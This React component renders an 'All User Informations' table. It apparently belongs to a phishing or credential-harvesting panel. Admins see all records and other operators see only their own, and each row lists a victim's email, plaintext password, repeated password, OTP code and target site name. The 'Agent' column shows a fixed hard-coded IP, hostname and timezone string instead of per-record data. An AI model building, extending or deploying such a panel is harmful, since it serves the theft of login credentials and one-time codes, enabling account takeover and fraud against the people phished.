import { useContext, useEffect, useState } from "react";
import { getData } from "../../api/fetching";
import { formatUtcToLocal } from "../../utils/DateFormater";
import { AuthContext } from "../../Contexts/AuthProvider";


const InformationTable = () => {
  const {role,user} = useContext(AuthContext)
  const [info,setInfo] = useState<[]>([])

  let url:string;
  useEffect(() => {
    const fetchData = async () => {
      
      try {
       
        if(role==='admin'){
          url = `information`
        }else{
          url = `information?id=${user?._id}`
        }
        const data = await getData(url);
        setInfo((data as any)?.data);
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    };

    fetchData();
  }, [user]);


    return (
      <div className="rounded-sm border border-stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:border-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
        <h4 className="mb-6 text-xl font-semibold text-black dark:text-white">
         All User Informations
        </h4>
  
  {/* for table */}
  
  <div className="relative overflow-x-auto shadow-md sm:rounded-lg">
    <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
      <thead className="text-xs text-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
        <tr>
          <th scope="col" className="px-6 py-3">
            ID
          </th>
          <th scope="col" className="px-6 py-3">
            Name
          </th>
          <th scope="col" className="px-6 py-3">
            Email
          </th>
          <th scope="col" className="px-6 py-3">
            Password
          </th>
          <th scope="col" className="px-6 py-3">
            Confirm Password
          </th>
          <th scope="col" className="px-6 py-3">
            OTP Code
          </th>
          <th scope="col" className="px-6 py-3">
           Agent
          </th>
          <th scope="col" className="px-6 py-3">
            Time
          </th>
          <th scope="col" className="px-6 py-3">
           Site
          </th>
   
        </tr>
      </thead>
      <tbody className='text-center'>
        {
          info?.map(({user,updatedAt,email,password,repassword,otp,siteName,_id},index)=>(
            <tr key={_id} className="odd:bg-stroke odd:dark:bg-black even:bg-transparent even:dark:bg-transparent border-t dark:border-gray-700">
            <th scope="row" className="px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
             {index + 1}
            </th>
            <td className="px-6 py-4">
            {(user as any)?.name}
            </td>
            <td className="px-6 py-4">
            {email}
            </td>
            <td className="px-6 py-4">
           {password}
            </td>
            <td className="px-6 py-4">
           {repassword}
            </td>
            <td className="px-6 py-4">
           {otp}
            </td>
            <td className="px-6 py-4">
            103.204.210.152,152.210.204.103-level3carrier.net,Asia/Dhaka
            </td>
    
            <td className="px-6 py-4">
           {formatUtcToLocal(updatedAt)}
            </td>
            <td className="px-6 py-4">
            {siteName}
            </td>
    
          </tr>
          ))
        }
  

  
  
  
  
      </tbody>
    </table>
  </div>
  
  
  
      </div>
    );
  };
  
  export default InformationTable;
  